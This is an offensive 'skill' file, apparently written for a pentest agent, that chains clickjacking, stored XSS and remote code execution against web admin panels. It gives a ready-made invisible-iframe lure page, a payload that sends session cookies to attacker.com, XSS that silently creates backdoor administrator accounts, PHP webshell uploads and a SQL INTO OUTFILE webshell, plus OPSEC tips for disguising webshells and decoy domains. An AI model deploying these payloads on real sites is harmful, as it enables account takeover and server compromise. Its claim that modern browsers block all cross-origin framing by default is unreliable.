---
name: clickjacking-xss-rce
description: Chain clickjacking → XSS → RCE — use clickjacking to trick admin into triggering stored XSS, then escalate to full RCE via webshell
version: 1.0.0
phase: chains
category: chain
tags: [chain, clickjacking, xss, rce, csrf-like]
tools: [curl, burp, python3, browser]
difficulty: advanced
opsec_level: medium
time_estimate: 4-8h
severity_if_found: critical
mitre_attack:
  - T1189
  - T1059
  - T1190
---

## When to Use

Use this skill when you find:
1. A page with missing `X-Frame-Options` or `frame-ancestors` CSP that can be iframed
2. A stored XSS injection point in a section that an admin user can access/modify (CMS settings, site configuration, profile fields, email templates, announcement bars, etc.)
3. The application has file upload or code execution capabilities that require admin privileges

This is a three-phase chain: the admin must click in the iframe to trigger XSS, the XSS must establish admin session control, and that control must lead to code execution.

## What It Does

Crafts an invisible clickjacking overlay that tricks an authenticated admin into clicking a button/control on the target page, triggering a stored XSS payload. The XSS payload then escalates to RCE by abusing admin-level functionality (file upload, code execution, plugin installation). Chain bridges client-side attack (clickjacking) with server-side compromise (RCE).

## Methodology

### Phase 1: Reconnaissance

**Find clickjackable pages:**

```bash
# Check X-Frame-Options and CSP headers
curl -s -I https://target.com/admin/settings | grep -i "frame-options\|frame-ancestors\|csp"

# If missing X-Frame-Options AND no frame-ancestors in CSP — clickjackable
# Also check: X-Frame-Options: ALLOW-FROM https://attacker.com (old IE, often bypassable)
```

**Find stored XSS injection points accessible to admins:**

| Entry Point | Admin Area | Payload Type |
|-------------|-----------|--------------|
| Site name / title | Settings → General | `<script>` or `<img onerror=` |
| Custom CSS/JS | Appearance → Customize | `</style><script>` |
| Email templates | Settings → Email | Mustache/template injection |
| Announcement bar | Plugins → Announcements | HTML injection |
| 404 page content | Settings → Error Pages | `<script src=//attacker>` |
| SEO meta descriptions | Settings → SEO | Event handler XSS |
| Widget content | Appearance → Widgets | `<div onmouseover=` |

**File upload/RCE vectors available as admin:**

- Media library upload (PHP/ASPX webshell if validation bypass)
- Plugin/theme installation from ZIP (arbitrary code execution)
- PHP file editor in admin panel (if present)
- Database backup/restore (SQL injection → OS command)
- Configuration save that writes to config files (Laravel .env, WordPress wp-config.php)

### Phase 2: Clickjacking Exploit

**Basic clickjacking PoC page:**

```html
<!DOCTYPE html>
<html>
<head>
  <title>Check out this cool video!</title>
  <style>
    iframe {
      position: absolute;
      top: -150px;    /* Offset to align target button */
      left: -50px;    /* Offset to align target button */
      width: 1400px;  /* Full viewport width */
      height: 1800px; /* Full viewport height */
      opacity: 0.001; /* Nearly invisible — do NOT use 0, some filters detect 0 */
      z-index: 1000;
      border: none;
    }
    .decoy-button {
      position: absolute;
      top: 300px;
      left: 200px;
      width: 200px;
      height: 60px;
      z-index: 1;
      background: linear-gradient(to right, #4CAF50, #45a049);
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      cursor: pointer;
    }
    .decoy-text {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 250px;
      color: #333;
    }
  </style>
</head>
<body>
  <div class="decoy-text">
    <h2>🎉 You've won a free upgrade!</h2>
    <p>Click below to claim your prize.</p>
    <button class="decoy-button" onclick="alert('Loading...')">Claim Now</button>
  </div>

  <!-- Target admin page iframed invisibly -->
  <iframe src="https://target.com/admin/settings/announcement"></iframe>

  <script>
    // Optional: detect if they started typing events and auto-submit
    // Or use drag-based clickjacking for more complex interactions
  </script>
</body>
</html>
```

**Advanced techniques for button targeting:**

```javascript
// Drag-based clickjacking (for multi-step actions)
// Instead of one click, the attacker drags element A over element B

// What's needed: align the decoy button exactly over the admin page's
// "Save" or "Update" button. Use pixel-perfect offsets determined
// during recon (load the admin page and measure element positions)

// Cursor-jacking: change cursor to trick admin into clicking
// (Mostly dead technique due to cross-origin restrictions as of 2024+)
```

**CSP frame-ancestors bypass:**

```html
<!-- If CSP allows *.attacker.com or specific subdomains -->
<iframe src="https://target.com/admin/settings"></iframe>

<!-- Browser-specific bypasses (legacy) -->
<!-- Edge (old): data: URIs in CSP directive -->
<!-- Safari: uses same-origin by default even without XFO -->
```

### Phase 3: XSS Payload Delivery

**Phase 3a: Inject the stored XSS (via admin click)**

The admin clicks the decoy button, which actually clicks "Save" on the admin settings page. The settings form already contains your XSS payload (injected during earlier recon or via a different vulnerability).

If you can pre-populate the form or inject the payload directly:

```
Payload: <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
```

If the XSS needs to be injected directly (not pre-populated):

```javascript
// XSS payload that creates a new admin user — more useful than cookie theft
fetch('/admin/users/create', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    username: 'backdoor_admin',
    email: 'attacker@evil.com',
    password: 'Hacked!2024!',
    role: 'administrator'
  })
}).then(() => {
  // Notify attacker
  fetch('https://attacker.com/notify?new_admin_created');
});

// OR: upload webshell via API
fetch('/admin/media/upload', {
  method: 'POST',
  body: (() => {
    const form = new FormData();
    form.append('file', new Blob(['<?php system($_GET["cmd"]); ?>'], {type: 'image/jpeg'}), 'shell.php.jpg');
    // Exploit double extension or content-type confusion
    return form;
  })()
});
```

**Phase 3b: XSS payload triggers from admin's authenticated session**

The critical insight: the stored XSS is triggered when the ADMIN views the page (or when any user views it, but the admin session has the privileges needed for RCE).

```javascript
// Stored XSS payload that:
// 1. Checks if current user is admin
// 2. If yes, creates a backdoor user
// 3. If no, does nothing (stays hidden)

fetch('/api/me')
  .then(r => r.json())
  .then(user => {
    if (user.role === 'admin') {
      // Create admin backdoor
      return fetch('/admin/users', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          user_login: 'safety_admin',
          user_email: 'attacker@evil.com',
          role: 'administrator'
        })
      });
    }
  })
  .catch(() => {});
```

### Phase 4: Remote Code Execution

With admin session control via XSS, exploit the first available RCE vector:

**Vector A — Backdoor admin user (no RCE needed):**

If the XSS payload successfully creates an admin user, you now have persistent admin access without RCE. Login as `backdoor_admin` / attacker password and explore from there.

**Vector B — Theme/Plugin file upload:**

```javascript
// XSS payload that exploits file upload functionality
// Upload a PHP webshell as media, then trigger it
fetch('/admin/theme/editor', {
  // ... modify a PHP file directly in the theme editor
});

// Then access: https://target.com/wp-content/themes/active-theme/shell.php?cmd=id
```

**Vector C — Config file injection:**

```javascript
// If the app writes config to PHP files (WordPress, Laravel, Symfony)
// Inject PHP code into a config value
fetch('/admin/settings', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'site_name=Hacked&site_description=;system("id");//'
  // If the description is unsafely injected into a PHP config file
});

// Then access the config page which includes the config file
```

**Vector D — Direct command execution (if available):**

```javascript
// Some CMS have "Run SQL query" or "PHP code execution" panels
fetch('/admin/tools/sql', {
  method: 'POST',
  body: 'query=SELECT "<?php system($_GET[\'cmd\']); ?>" INTO OUTFILE "/var/www/html/shell.php"'
});
```

### Full Chain Summary

```
Clickjacking page ──iframes──▸ Admin Settings page ──(click)──▸ Save Settings with stored XSS payload
       │                                                                │
       └── XSS payload creates backdoor admin ──▸ OR ──▸ Uploads webshell
                                                             │
                                                             └── Access webshell: /shell.php?cmd=id
                                                                                         │
                                                                                         └── RCE achieved
```

## Detection & OPSEC

**Detection by SOC:**
- X-Frame-Options/CSP violations logged when the admin page is loaded in an iframe (not always logged)
- Multiple clicks from a single IP within seconds (if the admin clicks repeatedly out of frustration)
- Unexpected admin user creation (SOC should have alerting for new privileged users)
- File uploads from unexpected locations (admin upload via clickjacked page has different Referer)
- Webshell creation outside normal media upload workflow

**OPSEC:**
- Host the clickjacking PoC on a domain that looks legitimate relative to the target
- Use a decoy page that makes sense (discount offer, browser update notification, survey)
- If using cookie-theft XSS, set up proper CORS endpoints to receive stolen data
- Don't use cookie theft if HttpOnly is set (most session cookies are HttpOnly now) — create backdoor users instead
- After RCE, clean up the webshell after use or rename it to blend in with legitimate files
- Restore any admin settings modified during the attack
- Remove the backdoor admin user if the engagement requires clean exit

**Limitations:**
- CSP with `frame-ancestors 'none'` or `X-Frame-Options: DENY` blocks clickjacking entirely
- Modern browsers (Chrome, Edge, Firefox) block iframing of cross-origin pages per default since 2024
- If the XSS payload uses `document.cookie` and the cookie is HttpOnly, you need alternative session hijack methods
- iOS Safari allows iframing of same-origin only — test explicitly on target browser matrix

## References

- OWASP Clickjacking Defense: https://owasp.org/www-community/attacks/Clickjacking
- OWASP XSS: https://owasp.org/www-community/attacks/XSS
- PortSwigger Clickjacking: https://portswigger.net/web-security/clickjacking
- Clickjacking + XSS chain examples: https://www.briskinfosec.com/blogs/post/clickjacking-to-xss-to-rce/
- CSP Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- XSS without parentheses (modern bypass): https://portswigger.net/research/xss-without-parentheses-and-semi-colons
